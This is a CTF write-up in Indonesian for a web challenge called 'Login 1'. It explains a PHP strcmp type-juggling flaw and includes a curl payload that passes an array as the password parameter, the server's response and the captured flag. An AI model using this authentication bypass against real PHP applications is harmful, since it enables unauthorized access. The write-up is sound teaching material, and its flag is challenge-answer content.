# __ASGama CTF__ 
## _Login 1_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 25 | l0l

**Description:** 

> http://ctf.asgama.web.id:40104/
>
> [login1.php](./login1.php)


### Login 1
Jika dilihat dari source codenya, program melakukan pengecekan apakah ada variable $_GET['password']. Jika ada, lakukan pengecekan dengan `strcmp` dengan key rahasia. 
```php
$secret = "==REDACTED==";
if(isset($_GET["password"])){
    $password = $_GET["password"];
    if(strcmp($password, $secret) == 0){ 
        echo "==REDACTED==";
    }else{
        echo "Password Salah";
    }
}
```

Kelemahannya disini adalah strcmp apabila yang dibandingkan bukan string, maka akan menghasilkan nilai 0. Misal kita bandingkan array dengan string menggunakan strcmp maka resultnya adalah 0.

### Payload
```
curl http://ctf.asgama.web.id:40104/\?password\[\]\=\[\]
```

### Result
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Login 1</title>
</head>
<body>
    <h1>Login 1</h1>
    <form action="">
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    <br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/home/web/index.php</b> on line <b>19</b><br />
GamaCTF{aw4s_strcmp}</body>
</html>
```

### Flag
GamaCTF{aw4s_strcmp}
